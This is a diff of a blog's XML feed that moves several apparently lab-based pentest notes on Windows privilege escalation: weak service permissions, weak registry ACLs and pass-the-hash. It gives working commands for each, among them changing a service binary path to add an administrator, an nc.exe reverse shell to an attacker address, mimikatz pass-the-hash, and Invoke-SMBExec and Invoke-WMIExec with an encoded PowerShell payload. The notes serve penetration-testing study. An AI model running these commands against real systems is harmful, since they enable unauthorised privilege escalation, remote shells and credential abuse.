+<h1 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h1><h4 id="Changing-the-Service-Binary-Path"><a href="#Changing-the-Service-Binary-Path" class="headerlink" title="Changing the Service Binary Path"></a>Changing the Service Binary Path</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools&gt; sc.exe config WindscribeService binpath=<span class="string">&quot;cmd /c net localgroup administrators htb-student /add&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Stop-Service"><a href="#Stop-Service" class="headerlink" title="Stop Service"></a>Stop Service</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools&gt; sc.exe stop WindscribeService</span><br></pre></td></tr></table></figure>
+
+<h4 id="Starte-the-Service"><a href="#Starte-the-Service" class="headerlink" title="Starte the Service"></a>Starte the Service</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools&gt; sc.exe <span class="built_in">start</span> WindscribeService</span><br></pre></td></tr></table></figure>
+
+<h4 id="Check-Privilege"><a href="#Check-Privilege" class="headerlink" title="Check Privilege"></a>Check Privilege</h4><p> &gt;➜ Now we are local <code>administrator</code>.</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools&gt; net localgroup administrators</span><br><span class="line"></span><br><span class="line">Members</span><br><span class="line"><span class="literal">-------------------------------------------------------------------------------</span></span><br><span class="line">Administrator</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Post-Exploitation</category>
+        <category>Windows Privesc</category>
+        <category>Services</category>
+      </categories>
+      <tags>
+        <tag>AccessChk</tag>
+        <tag>SharpUp</tag>
+        <tag>sc.exe</tag>
+        <tag>Windows-Services</tag>
+        <tag>Weak-Service-Permissions</tag>
+        <tag>Modifiable-Service</tag>
+        <tag>Service-Configuration</tag>
+        <tag>SERVICE_ALL_ACCESS</tag>
+        <tag>SERVICE_CHANGE_CONFIG</tag>
+      </tags>
   </entry>
   <entry>
     <title>User Account Control (UAC) Bypass</title>
@@ -3814,126 +3934,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Weak Registry ACLs</title>
-    <url>/2026/06/19/Weak-Registry-ACLs/</url>
-    <content><![CDATA[<blockquote>
-<p>➜ Weak Registry ACLs occur when a low-privileged user has write or full control permissions over a service registry key, allowing them to modify critical values such as <code>ImagePath</code>. This allows an attacker to change the service executable to a malicious binary and execute a malicious binary with SYSTEM privileges.</p>
-</blockquote>
-<h3 id="Enumerating-Weak-Registry-Permissions"><a href="#Enumerating-Weak-Registry-Permissions" class="headerlink" title="Enumerating Weak Registry Permissions"></a>Enumerating Weak Registry Permissions</h3><blockquote>
-<p>We can use AccessChk to identify services with weak registry permissions:</p>
-</blockquote>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\&gt; \<span class="title">ccesschk.exe</span> /<span class="title">accepteula</span> &quot;&lt;<span class="title">our</span>-<span class="title">user</span>&gt;&quot; -<span class="title">kvuqsw</span> <span class="title">hklm</span>\<span class="title">System</span>\<span class="title">CurrentControlSet</span>\<span class="title">services</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">RW</span> <span class="title">HKLM</span>\<span class="title">System</span>\<span class="title">CurrentControlSet</span>\<span class="title">services</span>\<span class="title">BTAGService</span>\<span class="title">Parameters</span>\<span class="title">Settings</span></span></span><br><span class="line"><span class="function">        <span class="title">KEY_QUERY_VALUE</span></span></span><br><span class="line"><span class="function">        <span class="title">KEY_CREATE_SUB_KEYa</span></span></span><br><span class="line"><span class="function">        <span class="title">KEY_ENUMERATE_SUB_KEYS</span></span></span><br><span class="line"><span class="function">        <span class="title">KEY_NOTIFY</span></span></span><br><span class="line"><span class="function">        <span class="title">KEY_SET_VALUE</span></span></span><br><span class="line"><span class="function">        <span class="title">READ_CONTROL</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">SNIP</span>&gt; </span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>➜ This means the current user has full control over the <code>ModelManagerService</code> registry key.</p>
-</blockquote>
-<h3 id="Modifying-the-Service-ImagePath"><a href="#Modifying-the-Service-ImagePath" class="headerlink" title="Modifying the Service ImagePath"></a>Modifying the Service ImagePath</h3><blockquote>
-<p>Since we have write access, we can change the service executable path to a malicious binary:</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS&gt; Set-ItemProperty -Path &quot;HKLM:\SYSTEM\CurrentControlSet\Services\&lt;ServiceName&gt;&quot; -Name ImagePath -Value &quot;C:\path\to\nc.exe -e cmd.exe &lt;our-ip&gt; &lt;our-port&gt;&quot;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>This modifies the service configuration to execute our malicious binary.</p>
-</blockquote>
-<h2 id="Restarting-the-Service"><a href="#Restarting-the-Service" class="headerlink" title="Restarting the Service"></a>Restarting the Service</h2><p>Restart the service to execute the malicious binary:</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">sc.exe stop &lt;ServiceName&gt;</span><br><span class="line">sc.exe <span class="built_in">start</span> &lt;ServiceName&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="Get-Reverse-Shell"><a href="#Get-Reverse-Shell" class="headerlink" title="Get Reverse Shell"></a>Get Reverse Shell</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜ rlwrap nc -lvnp our-port</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt; <span class="built_in">whoami</span></span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
-<blockquote>
-<p>➜ Weak Registry ACLs occur when a low-privileged user has <code>write</code> or <code>full control</code> permissions over a service’s registry key, allowing them to modify critical values such as <code>ImagePath</code>. By pointing <code>ImagePath</code> at a malicious binary and restarting the service, an attacker executes code under the service’s account, typically <code>SYSTEM</code>.</p>
-</blockquote>
-<h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h4 id="Enumerating-Weak-Registry-Permissions-1"><a href="#Enumerating-Weak-Registry-Permissions-1" class="headerlink" title="Enumerating Weak Registry Permissions"></a>Enumerating Weak Registry Permissions</h4><blockquote>
-<p>➜ We use AccessChk to recurse the services hive and list keys our user can write to. The <code>ImagePath</code> value lives directly under the service root key, so what we need is <code>KEY_SET_VALUE</code> on <code>HKLM\System\CurrentControlSet\services\&lt;service-name&gt;</code> itself</p>
-</blockquote>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\&gt; .\<span class="title">accesschk.exe</span> /<span class="title">accepteula</span> -<span class="title">kvuqsw</span> &quot;&lt;<span class="title">our</span>-<span class="title">user</span>&gt;&quot; <span class="title">hklm</span>\<span class="title">System</span>\<span class="title">CurrentControlSet</span>\<span class="title">services</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">RW</span> <span class="title">HKLM</span>\<span class="title">System</span>\<span class="title">CurrentControlSet</span>\<span class="title">services</span>\&lt;<span class="title">service</span>-<span class="title">name</span>&gt;</span></span><br><span class="line"><span class="function">        <span class="title">KEY_QUERY_VALUE</span></span></span><br><span class="line"><span class="function">        <span class="title">KEY_SET_VALUE</span></span></span><br><span class="line"><span class="function">        <span class="title">KEY_CREATE_SUB_KEY</span></span></span><br><span class="line"><span class="function">        <span class="title">KEY_ENUMERATE_SUB_KEYS</span></span></span><br><span class="line"><span class="function">        <span class="title">KEY_NOTIFY</span></span></span><br><span class="line"><span class="function">        <span class="title">READ_CONTROL</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">SNIP</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="Checking-the-Service-Account"><a href="#Checking-the-Service-Account" class="headerlink" title="Checking the Service Account"></a>Checking the Service Account</h4><blockquote>
-<p>➜ We confirm the service runs as <code>LocalSystem</code> with <code>sc qc</code>, this is what makes the payload execute as <code>SYSTEM</code>.</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; sc.exe qc &lt;service<span class="literal">-name</span>&gt;</span><br><span class="line"></span><br><span class="line">[<span class="type">SC</span>] QueryServiceConfig SUCCESS</span><br><span class="line"></span><br><span class="line">    SERVICE_NAME: &lt;service<span class="literal">-name</span>&gt;</span><br><span class="line">    <span class="built_in">TYPE</span>               : <span class="number">10</span>  WIN32_OWN_PROCESS</span><br><span class="line">    START_TYPE         : <span class="number">2</span>   AUTO_START</span><br><span class="line">    BINARY_PATH_NAME   : <span class="string">&quot;C:\Program Files\&lt;service-name&gt;\&lt;service-name&gt;.exe&quot;</span></span><br><span class="line">    SERVICE_START_NAME : LocalSystem</span><br></pre></td></tr></table></figure>
-
-<h1 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h1><h4 id="Modifying-the-Service-ImagePath-1"><a href="#Modifying-the-Service-ImagePath-1" class="headerlink" title="Modifying the Service ImagePath"></a>Modifying the Service ImagePath</h4><blockquote>
-<p>➜ Since we can write to the service key, we overwrite <code>ImagePath</code> to point at our payload. <code>nc.exe</code> must already be staged on disk at the path we reference.</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Set-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&quot;HKLM:\SYSTEM\CurrentControlSet\Services\&lt;service-name&gt;&quot;</span> <span class="literal">-Name</span> ImagePath <span class="literal">-Value</span> <span class="string">&quot;C:\Windows\Temp\nc.exe -e cmd.exe ip port&quot;</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="Starting-the-Listener"><a href="#Starting-the-Listener" class="headerlink" title="Starting the Listener"></a>Starting the Listener</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rlwrap nc -lvnp port</span><br></pre></td></tr></table></figure>
-
-<h4 id="Restarting-the-Service-1"><a href="#Restarting-the-Service-1" class="headerlink" title="Restarting the Service"></a>Restarting the Service</h4><blockquote>
-<p>➜ Restarting forces the service to launch our new <code>ImagePath</code> and this needs <code>SERVICE_STOP</code> and <code>SERVICE_START</code> over the service (or a reboot). A raw <code>nc</code> payload isn’t service-aware, so the SCM will time out after ~30 seconds and report a start failure, that’s expected and the shell fires regardless.</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; sc.exe stop &lt;service<span class="literal">-name</span>&gt;</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; sc.exe <span class="built_in">start</span> &lt;service<span class="literal">-name</span>&gt;</span><br></pre></td></tr></table></figure>
-<h4 id="Getting-a-SYSTEM-Shell"><a href="#Getting-a-SYSTEM-Shell" class="headerlink" title="Getting a SYSTEM Shell"></a>Getting a SYSTEM Shell</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  weak-registry rlwrap nc -lvnp port</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt; <span class="built_in">whoami</span></span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Post-Exploitation</category>
-        <category>Windows Privesc</category>
-        <category>Services</category>
-      </categories>
-      <tags>
-        <tag>Weak-ACL</tag>
-        <tag>AccessChk</tag>
-        <tag>sc.exe</tag>
-        <tag>Windows-Services</tag>
-        <tag>Weak-Registry-ACLs</tag>
-        <tag>Modifiable-Registry-Key</tag>
-        <tag>Registry-Permissions</tag>
-        <tag>ImagePath</tag>
-        <tag>KEY_SET_VALUE</tag>
-        <tag>Set-ItemProperty</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Weak Service Permissions</title>
-    <url>/2026/06/16/Weak-Service-Permissions/</url>
-    <content><![CDATA[<blockquote>
-<p>➜ Weak Service Permissions occur when a low-privileged user has excessive permissions over a service object ( SERVICE_CHANGE_CONFIG or SERVICE_ALL_ACCESS), allowing them to modify the service configuration such as the binary path and execute arbitrary code as SYSTEM.</p>
-</blockquote>
-<h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h4 id="Enumerates-Modifiable-Service’configuration"><a href="#Enumerates-Modifiable-Service’configuration" class="headerlink" title="Enumerates Modifiable Service’configuration"></a>Enumerates Modifiable Service’configuration</h4><p> &gt;➜ As we can see SharpUp identified that configuration of <code>WindscribeService.exe</code> is Modifiable</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; .\SharpUp.exe audit</span><br><span class="line"></span><br><span class="line">=== Modifiable Services ===</span><br><span class="line"></span><br><span class="line">  Name             : WindscribeService</span><br><span class="line">  DisplayName      : WindscribeService</span><br><span class="line">  Description      : Manages the firewall and controls the VPN tunnel</span><br><span class="line">  State            : Running</span><br><span class="line">  StartMode        : Auto</span><br><span class="line">  PathName         : <span class="string">&quot;C:\Program Files (x86)\Windscribe\WindscribeService.exe&quot;</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="Checking-the-Service-Account"><a href="#Checking-the-Service-Account" class="headerlink" title="Checking the Service Account"></a>Checking the Service Account</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PS C:\&gt; sc.exe qc WindscribeService  </span><br><span class="line">  </span><br><span class="line">[SC] QueryServiceConfig SUCCESS  </span><br><span class="line">  </span><br><span class="line">	SERVICE_NAME: WindscribeService  </span><br><span class="line">	TYPE : 10 WIN32_OWN_PROCESS  </span><br><span class="line">	START_TYPE : 2 AUTO_START  </span><br><span class="line">	BINARY_PATH_NAME : C:\Program Files (x86)\Windscribe\WindscribeService.exe  </span><br><span class="line">	SERVICE_START_NAME : LocalSystem</span><br></pre></td></tr></table></figure>
-
-<h4 id="Checking-Permissions-with-AccessChk"><a href="#Checking-Permissions-with-AccessChk" class="headerlink" title="Checking Permissions with AccessChk"></a>Checking Permissions with AccessChk</h4><p> &gt;➜ We can see that all Authenticated Users have <a href="https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights">SERVICE_ALL_ACCESS</a> rights over the service, which means full read&#x2F;write control over it.</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; .\accesschk.exe /accepteula <span class="literal">-quvcw</span> WindscribeService</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">WindscribeService</span><br><span class="line">  Medium Mandatory Level (Default) [<span class="type">No</span>-<span class="built_in">Write-Up</span>]</span><br><span class="line"></span><br><span class="line">  RW NT AUTHORITY\Authenticated Users</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h1><h4 id="Changing-the-Service-Binary-Path"><a href="#Changing-the-Service-Binary-Path" class="headerlink" title="Changing the Service Binary Path"></a>Changing the Service Binary Path</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools&gt; sc.exe config WindscribeService binpath=<span class="string">&quot;cmd /c net localgroup administrators htb-student /add&quot;</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="Stop-Service"><a href="#Stop-Service" class="headerlink" title="Stop Service"></a>Stop Service</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools&gt; sc.exe stop WindscribeService</span><br></pre></td></tr></table></figure>
-
-<h4 id="Starte-the-Service"><a href="#Starte-the-Service" class="headerlink" title="Starte the Service"></a>Starte the Service</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools&gt; sc.exe <span class="built_in">start</span> WindscribeService</span><br></pre></td></tr></table></figure>
-
-<h4 id="Check-Privilege"><a href="#Check-Privilege" class="headerlink" title="Check Privilege"></a>Check Privilege</h4><p> &gt;➜ Now we are local <code>administrator</code>.</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools&gt; net localgroup administrators</span><br><span class="line"></span><br><span class="line">Members</span><br><span class="line"><span class="literal">-------------------------------------------------------------------------------</span></span><br><span class="line">Administrator</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Post-Exploitation</category>
-        <category>Windows Privesc</category>
-        <category>Services</category>
-      </categories>
-      <tags>
-        <tag>AccessChk</tag>
-        <tag>SharpUp</tag>
-        <tag>sc.exe</tag>
-        <tag>Windows-Services</tag>
-        <tag>Weak-Service-Permissions</tag>
-        <tag>Modifiable-Service</tag>
-        <tag>Service-Configuration</tag>
-        <tag>SERVICE_ALL_ACCESS</tag>
-        <tag>SERVICE_CHANGE_CONFIG</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Windows Credential Hunting</title>
     <url>/2025/11/26/Windows-Credential-Hunting/</url>
     <content><![CDATA[<h2 id="Common-Password-Location"><a href="#Common-Password-Location" class="headerlink" title="Common Password Location"></a>Common Password Location</h2><ul>
@@ -3979,35 +3979,6 @@
       <tags>
         <tag>Lazagne</tag>
         <tag>Search-for-File-Content</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Windows Pass the Hash (PtH)</title>
-    <url>/2025/11/27/Windows-Pass-the-Hash-PtH/</url>
-    <content><![CDATA[<h1 id="Mimikatz-local-administrator-privilege"><a href="#Mimikatz-local-administrator-privilege" class="headerlink" title="Mimikatz ( local administrator privilege  )"></a>Mimikatz ( local administrator privilege  )</h1><p>➜ This command will create a new CMD session using the permissions of the user we want to impersonate.</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mimikatz.exe privilege::debug <span class="string">&quot;sekurlsa::pth /user:username /NTLM:&lt;hash&gt; /domain:&lt;domain&gt; /run:cmd.exe&quot;</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
-
-<p>➜ When impersonating a local account, the <code>/domain</code> parameter should be set to <code>localhost</code> or simply <code>.</code></p>
-<h1 id="PowerShell-Invoke-TheHash"><a href="#PowerShell-Invoke-TheHash" class="headerlink" title="PowerShell Invoke-TheHash"></a>PowerShell Invoke-TheHash</h1><p>➜ Since <a href="https://github.com/Kevin-Robertson/Invoke-TheHash">Invoke-TheHash</a> uses <code>Invoke-SMBExec</code> and <code>Invoke-WMIExec</code> to authenticate and execute commands on the target, the NTLM hash used must belong to an <code>account with administrative rights</code> on the target.</p>
-<h4 id="Invoke-TheHash-with-SMB"><a href="#Invoke-TheHash-with-SMB" class="headerlink" title="Invoke-TheHash with SMB"></a>Invoke-TheHash with SMB</h4><p>➜ This command creates a new local user account and adds it to the <code>local Administrators group</code> on the target machine.</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> c:\tools\<span class="built_in">Invoke-TheHash</span>&gt; <span class="built_in">Import-Module</span> .\<span class="built_in">Invoke-TheHash</span>.psd1</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> c:\tools\<span class="built_in">Invoke-TheHash</span>&gt; <span class="built_in">Invoke-SMBExec</span> <span class="literal">-Target</span> &lt;tar<span class="built_in">get-ip</span>&gt; <span class="literal">-Domain</span> &lt;domain&gt; <span class="literal">-Username</span> &lt;username&gt; <span class="literal">-Hash</span> &lt;hash&gt; <span class="literal">-Command</span> <span class="string">&quot;net user mark Password123 /add &amp;&amp; net localgroup administrators mark /add&quot;</span> <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="Invoke-TheHash-with-WMI"><a href="#Invoke-TheHash-with-WMI" class="headerlink" title="Invoke-TheHash with WMI"></a>Invoke-TheHash with WMI</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\tools&gt; .\nc.exe -lvnp &lt;Port&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS c:\tools\Invoke-TheHash&gt; Import-Module .\Invoke-TheHash.psd1</span><br><span class="line"></span><br><span class="line">PS c:\tools\Invoke-TheHash&gt; Invoke-WMIExec -Target target -Domain domain -Username username -Hash hash -Command &quot;powershell -e JABjAGwAaQBlAG4Ad &lt;snip&gt; AGwAbwBzAGUAKAApAA==&quot;</span><br></pre></td></tr></table></figure>
-
-
-
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Post-Exploitation</category>
-        <category>Pass the Hash (PtH)</category>
-      </categories>
-      <tags>
-        <tag>mimikatz</tag>
-        <tag>Invoke-TheHash</tag>
       </tags>
   </entry>
   <entry>
@@ -4145,6 +4116,35 @@
         <tag>ipconfig</tag>
         <tag>Get-HotFix</tag>
         <tag>Get-Process</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Windows Pass the Hash (PtH)</title>
+    <url>/2025/11/27/Windows-Pass-the-Hash-PtH/</url>
+    <content><![CDATA[<h1 id="Mimikatz-local-administrator-privilege"><a href="#Mimikatz-local-administrator-privilege" class="headerlink" title="Mimikatz ( local administrator privilege  )"></a>Mimikatz ( local administrator privilege  )</h1><p>➜ This command will create a new CMD session using the permissions of the user we want to impersonate.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mimikatz.exe privilege::debug <span class="string">&quot;sekurlsa::pth /user:username /NTLM:&lt;hash&gt; /domain:&lt;domain&gt; /run:cmd.exe&quot;</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
+
+<p>➜ When impersonating a local account, the <code>/domain</code> parameter should be set to <code>localhost</code> or simply <code>.</code></p>
+<h1 id="PowerShell-Invoke-TheHash"><a href="#PowerShell-Invoke-TheHash" class="headerlink" title="PowerShell Invoke-TheHash"></a>PowerShell Invoke-TheHash</h1><p>➜ Since <a href="https://github.com/Kevin-Robertson/Invoke-TheHash">Invoke-TheHash</a> uses <code>Invoke-SMBExec</code> and <code>Invoke-WMIExec</code> to authenticate and execute commands on the target, the NTLM hash used must belong to an <code>account with administrative rights</code> on the target.</p>
+<h4 id="Invoke-TheHash-with-SMB"><a href="#Invoke-TheHash-with-SMB" class="headerlink" title="Invoke-TheHash with SMB"></a>Invoke-TheHash with SMB</h4><p>➜ This command creates a new local user account and adds it to the <code>local Administrators group</code> on the target machine.</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> c:\tools\<span class="built_in">Invoke-TheHash</span>&gt; <span class="built_in">Import-Module</span> .\<span class="built_in">Invoke-TheHash</span>.psd1</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> c:\tools\<span class="built_in">Invoke-TheHash</span>&gt; <span class="built_in">Invoke-SMBExec</span> <span class="literal">-Target</span> &lt;tar<span class="built_in">get-ip</span>&gt; <span class="literal">-Domain</span> &lt;domain&gt; <span class="literal">-Username</span> &lt;username&gt; <span class="literal">-Hash</span> &lt;hash&gt; <span class="literal">-Command</span> <span class="string">&quot;net user mark Password123 /add &amp;&amp; net localgroup administrators mark /add&quot;</span> <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Invoke-TheHash-with-WMI"><a href="#Invoke-TheHash-with-WMI" class="headerlink" title="Invoke-TheHash with WMI"></a>Invoke-TheHash with WMI</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\tools&gt; .\nc.exe -lvnp &lt;Port&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS c:\tools\Invoke-TheHash&gt; Import-Module .\Invoke-TheHash.psd1</span><br><span class="line"></span><br><span class="line">PS c:\tools\Invoke-TheHash&gt; Invoke-WMIExec -Target target -Domain domain -Username username -Hash hash -Command &quot;powershell -e JABjAGwAaQBlAG4Ad &lt;snip&gt; AGwAbwBzAGUAKAApAA==&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Post-Exploitation</category>
+        <category>Pass the Hash (PtH)</category>
+      </categories>
+      <tags>
+        <tag>mimikatz</tag>
+        <tag>Invoke-TheHash</tag>
       </tags>
   </entry>
   <entry>
